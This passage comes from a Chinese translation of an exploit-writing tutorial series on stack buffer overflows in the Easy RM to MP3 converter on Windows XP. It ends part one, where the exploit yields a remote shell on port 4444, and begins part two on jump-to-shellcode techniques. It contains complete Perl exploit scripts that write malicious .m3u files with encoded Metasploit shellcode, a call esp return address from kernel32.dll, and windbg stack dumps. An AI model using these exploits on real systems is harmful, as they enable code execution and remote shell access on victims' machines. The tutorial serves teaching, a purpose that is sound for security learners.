"\x32\x46\x4d\x4b\x4e\x51\x52\x46\x4c\x4d\x43\x4c\x4d\x42"
"\x5a\x50\x38\x4e\x4b\x4e\x4b\x4e\x4b\x43\x58\x42\x52\x4b"
"\x4e\x4e\x53\x42\x36\x4b\x4f\x43\x45\x51\x54\x4b\x4f\x49"
"\x46\x51\x4b\x46\x37\x46\x32\x50\x51\x50\x51\x46\x31\x42"
"\x4a\x45\x51\x46\x31\x46\x31\x51\x45\x50\x51\x4b\x4f\x48"
"\x50\x43\x58\x4e\x4d\x4e\x39\x45\x55\x48\x4e\x51\x43\x4b"
"\x4f\x49\x46\x43\x5a\x4b\x4f\x4b\x4f\x47\x47\x4b\x4f\x48"
"\x50\x4c\x4b\x46\x37\x4b\x4c\x4c\x43\x49\x54\x45\x34\x4b"
"\x4f\x4e\x36\x50\x52\x4b\x4f\x48\x50\x43\x58\x4c\x30\x4c"
"\x4a\x44\x44\x51\x4f\x46\x33\x4b\x4f\x48\x56\x4b\x4f\x48"
"\x50\x41\x41";
open($FILE,">$file");
print $FILE $junk.$eip.$shellcode;
close($FILE);
print "m3u File Created successfully\n";
创建这个m3u文件并打开，现在Easy RM to MP3看起来像是被挂起了：
Telnet主机的4444端口：
root@bt:/# telnet 192.168.0.197 4444
Trying 192.168.0.197...
Connected to 192.168.0.197.
Escape character is '^]'.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
C:\Program Files\Easy RM to MP3 Converter>
哦也！
现在退出并编写你自己的shellcode吧。不要忘了做你自己的nice ascii art，获得一个133t 名
字，和发送你的祝福给我(corelanc0d3r) :-)
Exploit 编写系列教程第二篇: 栈溢出——跳至 shellcode
【作者】：Peter Van Eeckhoutte
【译者】：riusksk（泉哥：http://riusksk.blogbus.com）
跳至何处？
在上篇教程中（Exploit 编写系列教程第一篇：基于栈的溢出），笔者已讲述了关于漏洞发现，以及利用这些信息来编写可行的 exploit 的相关
基础知识。本文所举的例子仍旧是上篇中的实例，我们已经知道ESP几乎直接指向我们缓冲区的入口（我只是为shellcode预先放置了4字节数
据，以便使ESP直接指向shellcode），这样我们就可以使用“jmp esp”指令来获得shellcode的执行。
注意：本篇教程很大程度上是以本系列教程的第一部分为基础来编写的，因此请读者在阅读本文前，先花点时间将第一部分的内容阅读并理解
了。
事实上，我们利用“jmp esp”来跳至shellcode的方法是一个近乎完美的方法，但并不是每次都这么容易实现的。本文将就此讲述关于执行/跳
转至shellcode的其它方法，最后你要面临的问题就是缓冲区是否足够大。
以下为迫使shellcode执行的多种方法：
● jump/call到一个指向shellcode的寄存器。利用这种技术，你可以利用这个包含shellcode地址的寄存器，将该地址置入EIP中来实现。你可
以利用程序运行时加载的DLL，去搜索”jump/call register”等操作指令所在的内存地址。当构造payload时，我们就可以利用该内存地址去覆
盖EIP。当然，如果有一个直接指向shellcode的寄存器可以利用，那也不是不可以的。但由于在第一部分中我们正是利用这种方法来尽力使
exploit得以执行的，因此本文将不再赘述此种方法。
● pop return: 如果栈顶并没有指向攻击者指定的缓冲区，但此缓冲区又起始于栈顶下方的数字节处，那么你就可以使程序执行一系列的 POP
指令和一个RET指令，以此将这些字节弹出栈（每POP一次，ESP指针就更接近shellcode入口一步），直至正确的缓冲区入口处。执行RET
指令后，ESP中的当前栈值将放入EIP中。因此当ESP+x包含我们的shellcode所在的缓冲区地址时（当在调试器中执行命令“d esp”时，
你就可以看到在ESP+offset中的缓冲区地址，但由于Intel x86是属于小端法机器，因此数据可能是反序的），POP RET方法还是可行的。
● push return: 这种方法明显不同于“call register”技术。如果你找不到或者的机器码，那么你可以简单将一个地
址压栈，然后执行ret，因此你只需搜索ret之后的push 指令即可。先查找这一串操作指令，再查找执行这串指令的地址，最后利用
该地址覆盖EIP。
● jmp [reg + offset]: 如果寄存器指向包含shellcode地址的缓冲区，但其并没有指向shellcode入口，那么你可以通过搜索操作系统或者应用程
序加载的DLL中的指令，并向该指令中的寄存器添加上所需的字节偏移量，然后跳转至寄存器所指向的地址。笔者将此种方法称为jmp [reg
+ offset]。
● blind return: 在第一部分教程中，笔者已经讲过ESP指向当前栈基址。RET指令将从栈中‘pop’新值（4字节），然后将那地址放入ESP中。
因此如果用RET指令所在地址去覆盖EIP，那么你将会把ESP中的值置入ESI。
● 如果缓冲区中的可用空间被限制了（EIP被覆盖之后），但是在覆写EIP之前还有不少空间可利用，那么你可以先在小空间的缓冲区中执行jump
code，以跳转至缓冲区首部的关键shellcode。
● SHE：每一程序中均有默认的异常处理程序，这是由操作系统提供的。因此即使程序原本就没有使用异常处理，但你也可以用自己的地址去
覆盖SHE handler，以使其跳转至shellcode。利用SHE可以使exploit在windows平台下运行得更为稳定，但在利用SHE编写exploit之前，
你需要先掌握一些知识。如果你编写的exploit无法在被给的操作系统中运行，那么payload可能会导致程序崩溃（触发异常）。因此你可以将
“regular”exploit配合覆盖SHE的方式来编写exploit，以此编写出更为可靠的exploit。在本系列教程的下一篇文章（第三部分）中将讲述关
于SHE的内容，这里读者只需记住：在一个被覆写EIP的典型栈溢出中，也可以利用SHE技术来编写exploit，以使其运行得更为稳定，同
时获取更大可用空间的缓冲区（覆盖EIP以触发SHE„„真可谓一箭双雕）。
这里还有很多其它可以使exploit稳定运行的方法，但如果你精通以上利用技术，再结合你的知识，你也是可以找出一种更为可行的方法使exploit
跳至shellcode。如果一项技术是可行，但shellcode并没有运行，这时你可以利用shellcode编码器将其编码，再将shellcode后移一段，然后在
shellcode之前写入一些NOP„这些都将使你的exploit工作得更好！当然，有些漏洞只能导致程序崩溃，而无法利用，这也是完全可能存在的。
接下来让我们看看上面列出的那些技术的具体实现方法。
call [reg]
如果一个直接指向shellcode地址的寄存器被加载，那么你可以利用call [reg]直接跳至shellcode。换句话说，如果ESP直接指向shellcode（因此
ESP的首字节即是shellcode的首字节），如果这时你用“call esp”地址覆盖EIP，那么shellcode将被执行。这种方法在所有寄存器下均可行，
并且十分流行，因为kernel32.dll中包含有很多call [reg]地址。
例如：假设ESP指向shellcode，首先搜索包含’call esp’操作码的地址。我们可以找到jmp:
findjmp.exe kernel32.dll esp
Findjmp, Eeye, I2S-LaB
Findjmp2, Hat-Squad
Scanning kernel32.dll for code useable with the esp register
0x7C836A08 call esp
0x7C874413 jmp esp
Finished Scanning kernel32.dll for code useable with the esp register
Found 2 usable addresses
接下来，编写exploit，并用地址0x7c836a08覆盖EIP。这里使用本系列教程第一部分中的实例Easy RM to MP3来讲解,我们可以通过在被覆写
的EIP与ESP之间添加4字符，以此将ESP指向shellcode入口。典型的一份exploit代码如下：
my $file= "test1.m3u";
my $junk= "A" x 26094;
my $eip = pack('V',0x7C836A08); #overwrite EIP with call esp
my $prependesp = "XXXX"; #add 4 bytes so ESP points at beginning of shellcode bytes
my $shellcode = "\x90" x 25; #start shellcode with some NOPS
# windows/exec - 303 bytes
# http://www.metasploit.com
# Encoder: x86/alpha_upper
# EXITFUNC=seh, CMD=calc
$shellcode = $shellcode . "\x89\xe2\xda\xc1\xd9\x72\xf4\x58\x50\x59\x49\x49\x49\x49" .
"\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56" .
"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41" .
"\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42" .
"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4a" .
"\x48\x50\x44\x43\x30\x43\x30\x45\x50\x4c\x4b\x47\x35\x47" .
"\x4c\x4c\x4b\x43\x4c\x43\x35\x43\x48\x45\x51\x4a\x4f\x4c" .
"\x4b\x50\x4f\x42\x38\x4c\x4b\x51\x4f\x47\x50\x43\x31\x4a" .
"\x4b\x51\x59\x4c\x4b\x46\x54\x4c\x4b\x43\x31\x4a\x4e\x50" .
"\x31\x49\x50\x4c\x59\x4e\x4c\x4c\x44\x49\x50\x43\x44\x43" .
"\x37\x49\x51\x49\x5a\x44\x4d\x43\x31\x49\x52\x4a\x4b\x4a" .
"\x54\x47\x4b\x51\x44\x46\x44\x43\x34\x42\x55\x4b\x55\x4c" .
"\x4b\x51\x4f\x51\x34\x45\x51\x4a\x4b\x42\x46\x4c\x4b\x44" .
"\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x45\x51\x4a\x4b\x4c" .
"\x4b\x45\x4c\x4c\x4b\x45\x51\x4a\x4b\x4d\x59\x51\x4c\x47" .
"\x54\x43\x34\x48\x43\x51\x4f\x46\x51\x4b\x46\x43\x50\x50" .
"\x56\x45\x34\x4c\x4b\x47\x36\x50\x30\x4c\x4b\x51\x50\x44" .
"\x4c\x4c\x4b\x44\x30\x45\x4c\x4e\x4d\x4c\x4b\x45\x38\x43" .
"\x38\x4b\x39\x4a\x58\x4c\x43\x49\x50\x42\x4a\x50\x50\x42" .
"\x48\x4c\x30\x4d\x5a\x43\x34\x51\x4f\x45\x38\x4a\x38\x4b" .
"\x4e\x4d\x5a\x44\x4e\x46\x37\x4b\x4f\x4d\x37\x42\x43\x45" .
"\x31\x42\x4c\x42\x43\x45\x50\x41\x41";
open($FILE,">$file");
print $FILE $junk.$eip.$prependesp.$shellcode;
close($FILE);
print "m3u File Created successfully\n";
测试结果：
pop ret
正如上面所述的一般，在Easy RM to MP3一例中，我们已经能够调整缓冲区，使ESP直接指向我们的shellcode。但要是shellcode入口发生偏
移呢？比如shellcode入口位于ESP+8，这又当如何利用呢？理论上，当ESP+offset已经包含shellcode地址，那么只有pop ret这种方法是可行
的„„如果不是如此（事情往往并非如此），那么也许还有其它方法。
下面进行一项测试。我们已知覆盖EIP需要26094 byte，另外在ESP指向的栈址（本例中为0x000ff730）前还需要4byte。为了模拟出shellcode
起始于ESP+8的假象，我们需要构造出一块栈情况如下的缓冲区：
26094 A,4 XXXX(以ESP指针指向的地址结尾)，INT3中断，7 NOP，INT3中断，一些NOP。
我们预先将shellcode入口置于第二个中断之后，目的是为了跳过第一个中断，使其正确地到达第二个中断（[ESP+8]=0x000ff738）。
my $file= "test1.m3u";
my $junk= "A" x 26094;
my $eip = "BBBB"; #overwrite EIP
my $prependesp = "XXXX"; #add 4 bytes so ESP points at beginning of shellcode bytes
my $shellcode = "\xcc"; #first break
$shellcode = $shellcode . "\x90" x 7; #add 7 more bytes
$shellcode = $shellcode . "\xcc"; #second break
$shellcode = $shellcode . "\x90" x 500; #real shellcode
open($FILE,">$file");
print $FILE $junk.$eip.$prependesp.$shellcode;
close($FILE);
print "m3u File Created successfully\n";
让我们看下栈情况：
由于缓冲区溢出，程序崩溃。我们用“BBBB”覆盖EIP，ESP指向0x000ff730（起始于第一中断），然后7个NOP，接着就是第二中断，即shellcode
入口（0x000ff738）。
eax=00000001 ebx=00104a58 ecx=7c91005d edx=00000040 esi=77c5fce0 edi=000067fa
eip=42424242 esp=000ff730 ebp=00344200 iopl=0 nv up ei pl nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206
Missing image name, possible paged-out or corrupt data.
Missing image name, possible paged-out or corrupt data.
Missing image name, possible paged-out or corrupt data.
+0x42424231:
42424242 ?? ???
0:000> d esp
000ff730 cc 90 90 90 90 90 90 90-cc 90 90 90 90 90 90 90 ................
000ff740 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff750 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff760 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff770 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff780 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff790 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff7a0 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
0:000> d 000ff738
000ff738 cc 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff748 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff758 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff768 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff778 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff788 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff798 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff7a8 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
为了将ESP+8的值赋予EIP，（如此构造使其跳至shellcode），我们将使用pop ret技术+jmp esp地址来完成此项任务。
一个POP指令将弹出栈顶4字节，因此栈指针将指向000ff734。再运行一个pop指令，将会从栈顶中再弹出4字节，此时ESP就指向了000ff738。
当ret指令被执行后，ESP的当前值将赋予EIP。因此如果在000ff738包含有jmp esp指令的地址，那么EIP又将执行何种行为呢。此时000ff738
之后的缓冲区就必须包含shellcode。
我们需要查找出 pop,pop,ret 的指令串地址，然后用这指令串的首地址来覆盖 EIP，接着让 ESP+8 指向 jmp esp 指令地址，最后紧跟着的就是
shellcode自身了。首先需要搜索pop pop ret机器码，这个我们可以借助windbg的汇编功能来搜索：
0:000> a
7c90120e pop eax
pop eax
7c90120f pop ebp
pop ebp
7c901210 ret
ret
7c901211
0:000> u 7c90120e
ntdll!DbgBreakPoint:
7c90120e 58 pop eax
7c90120f 5d pop ebp
7c901210 c3 ret
7c901211 ffcc dec esp
7c901213 c3 ret
7c901214 8bff mov edi,edi
7c901216 8b442404 mov eax,dword ptr [esp+4]
7c90121a cc int 3
因此pop pop ret指令的机器码为0x58,0x5d,0xc3。当然你也可pop其它寄存器，这里有其它可用的pop机器码：
Pop register Opcode
pop eax 58